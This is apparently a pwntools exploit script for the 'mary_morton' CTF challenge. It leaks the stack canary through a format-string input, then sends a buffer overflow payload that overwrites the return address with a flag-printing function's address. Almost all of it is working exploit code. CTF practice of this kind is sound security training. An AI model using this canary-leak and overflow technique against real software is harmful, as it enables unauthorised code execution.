from pwn import *
from pwnlib.tubes import *
from pwnlib.util.packing import *
from pwnlib.tubes.process import *
from pwnlib.tubes.remote import *
import struct
import time

target = "mary_morton"
local = True
binary = ELF ( target )
getFlag = p64(0x004008da)
#libc = ELF('./libc.so.6')
#PUTSPLT = binary.plt['puts']
#ATOIGOT = binary.got['atoi']
#PUTSGOT =  binary.got['puts']
#READGOT =  binary.got['read']
#MEMCOPYGOT = binary.got['memcpy']

#Setting Enable Environment
# context
context.update(arch='i686', os='linux')
#context.clear(arch=target.arch)
context.log_level = 'debug'
#log_level must be one of ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw', '-h']


def getConn(local):
    #return process('./swap', env = {"LD_PRELOAD":"./libc.so.6"}) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)
    #return process(target) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)
    return remote('localhost',40645)

def send(s):
    print s
    r.sendline(s)
def getMenu(s):
    print s.recvuntil('Exit the battle \n')

r = getConn(local)
getMenu(r)
send("2")
send("%23$p")
#leak_canary = u64(r.recv(18).ljust(16, '\x00'))
leak = r.recvline()
print leak
#print leak.ljust(16,'\x00')
#print leak[2:].decode('hex')
#print hex(leak[2:])
#print ((leak[2:]+"\x00")).decode("hex")
#print hex(u64(leak[2:]))
#leak_canary = u64(leak.ljust(16, '\x00'))
#leak_canary= u64(leak)
leak_canary= int(leak, 16)
#success(hex(leak_canary))
print "Leak Value :  0x%x"%leak_canary
getMenu(r)
r.send("1")
payload = "A"*(16*8+8)+p64(leak_canary)+"B"*8+getFlag*100#+p64(0)+"C"*200
#log.info("Payload : %x" % payload)
r.send(payload)
log.info("Send Payload")
#r.recvline()
r.interactive()
r.close()

